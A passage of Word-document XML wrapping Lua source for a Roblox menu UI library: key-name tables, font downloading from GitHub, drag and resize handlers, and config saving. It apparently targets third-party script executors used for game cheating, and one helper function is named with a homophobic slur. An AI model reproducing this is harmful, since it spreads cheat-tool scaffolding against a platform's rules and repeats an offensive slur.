        <w:t xml:space="preserve">        [Enum.KeyCode.Period] = ".",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Slash] = "/",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Asterisk] = "*",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Plus] = "+",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Period] = ".",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Backquote] = "`",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton1] = "MB1",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton2] = "MB2",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.UserInputType.MouseButton3] = "MB3",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Escape] = "ESC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        [Enum.KeyCode.Space] = "SPC",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    library.__index = library</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, path in next, library.folders do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        makefolder(library.directory .. path)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local flags = library.flags </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local config_flags = library.config_flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local notifications = library.notifications </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local fonts = {}; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function Register_Font(Name, Weight, Style, Asset)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not isfile(Asset.Id) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                writefile(Asset.Id, Asset.Font)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if isfile(Name .. ".font") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                delfile(Name .. ".font")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = Name,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                faces = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        weight = Weight,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        style = Style,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        assetId = getcustomasset(Asset.Id),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            writefile(Name .. ".font", http_service:JSONEncode(Data))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return getcustomasset(Name .. ".font");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local Medium = Register_Font("Meawdawdawddium", 200, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Id = "Mediumawdwad.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Inter_28pt-Medium.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SemiBold = Register_Font("SeawdawdawdawdmiBold", 200, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Id = "SemiBoldawdawdwad.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Inter_28pt-SemiBold.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fonts = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            small = Font.new(Medium, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            font = Font.new(SemiBold, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">-- Library functions </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Misc functions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:tween(obj, properties, easing_style, time) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local tween = tween_service:Create(obj, TweenInfo.new(time or 0.25, easing_style or Enum.EasingStyle.Quint, Enum.EasingDirection.InOut, 0, false, 0), properties):Play()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return tween</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:resizify(frame) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Frame = Instance.new("TextButton")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Position = dim2(1, -10, 1, -10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BorderColor3 = rgb(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Size = dim2(0, 10, 0, 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BorderSizePixel = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Parent = frame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.BackgroundTransparency = 1 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.Text = ""</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local resizing = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start_size </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local og_size = frame.Size  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Frame.InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    resizing = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start = input.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start_size = frame.Size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Frame.InputEnded:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    resizing = false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library:connection(uis.InputChanged, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if resizing and input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_x = camera.ViewportSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_y = camera.ViewportSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local current_size = dim2(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.X.Scale,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        math.clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.X.Offset + (input.Position.X - start.X),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            og_size.X.Offset,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_x</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.Y.Scale,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        math.clamp(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            start_size.Y.Offset + (input.Position.Y - start.Y),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            og_size.Y.Offset,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            viewport_y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        )</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(frame, {Size = current_size}, Enum.EasingStyle.Linear, 0.05)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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function fag(tbl)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Size = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _ in tbl do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = Size + 1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return Size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function library:next_flag()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local index = fag(library.flags) + 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local str = string.format("flagnumber%s", index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return str;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:mouse_in_frame(uiobject)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local y_cond = uiobject.AbsolutePosition.Y &lt;= mouse.Y and mouse.Y &lt;= uiobject.AbsolutePosition.Y + uiobject.AbsoluteSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local x_cond = uiobject.AbsolutePosition.X &lt;= mouse.X and mouse.X &lt;= uiobject.AbsolutePosition.X + uiobject.AbsoluteSize.X</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return (y_cond and x_cond)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:draggify(frame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local dragging = false </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start_size = frame.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local start </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            frame.InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start = input.Position</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    start_size = frame.Position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frame.InputEnded:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    dragging = false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library:connection(uis.InputChanged, function(input, game_event) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if dragging and input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_x = camera.ViewportSize.X</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local viewport_y = camera.ViewportSize.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local current_position = dim2(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.X.Offset + (input.Position.X - start.X),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        start_size.Y.Offset + (input.Position.Y - start.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(frame, {Position = current_position}, Enum.EasingStyle.Linear, 0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:close_element()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end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:convert(str)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local values = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for value in string.gmatch(str, "[^,]+") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                insert(values, tonumber(value))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if #values == 4 then              </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return unpack(values)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return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function library:convert_enum(enum)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local enum_parts = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for part in string.gmatch(enum, "[%w_]+") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                insert(enum_parts, part)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local enum_table = Enum</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i = 2, #enum_parts do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local enum_item = enum_table[enum_parts[i]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                enum_table = enum_item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return enum_table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local config_holder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:update_config_list() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not config_holder then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return 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local list = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for idx, file in listfiles(library.directory .. "/configs") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local name = file:gsub(library.directory .. "/configs\\", ""):gsub(".cfg", ""):gsub(library.directory .. "\\configs\\", "")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                list[#list + 1] = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_holder.refresh_options(list)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:get_config()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Config = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in next, flags do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if type(v) == "table" and v.key then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = {active = v.active, mode = v.mode, key = tostring(v.key)}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif type(v) == "table" and v["Transparency"] and v["Color"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = {Transparency = v["Transparency"], Color = v["Color"]:ToHex()}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config[_] = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end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return http_service:JSONEncode(Config)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:load_config(config_json) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local config = http_service:JSONDecode(config_json)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, v in config do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local function_set = library.config_flags[_]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if _ == "config_name_list" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    continue </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if function_set then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if type(v) == "table" and v["Transparency"] and v["Color"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(hex(v["Color"]), v["Transparency"])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    elseif type(v) == "table" and v["active"] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        function_set(v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end 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library:round(number, float) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local multiplier = 1 / (float or 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return floor(number * multiplier + 0.5) / multiplier</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:apply_theme(instance, theme, property) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            insert(themes.utility[theme][property], instance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:update_theme(theme, color)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, property in themes.utility[theme] do </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for m, object in property do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if object[_] == themes.preset[theme] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        object[_] = color </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            themes.preset[theme] = color </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:connection(signal, callback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local connection = signal:Connect(callback)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            insert(library.connections, connection)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return connection </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:close_element(new_path) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local open_element = library.current_open</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if open_element and new_path ~= open_element then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open_element.set_visible(false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open_element.open = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if new_path ~= open_element then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library.current_open = new_path or nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:create(instance, options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local ins = Instance.new(instance) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for prop, value in options do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ins[prop] = value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return ins </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:unload_menu() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library[ "items" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library[ "items" ]:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
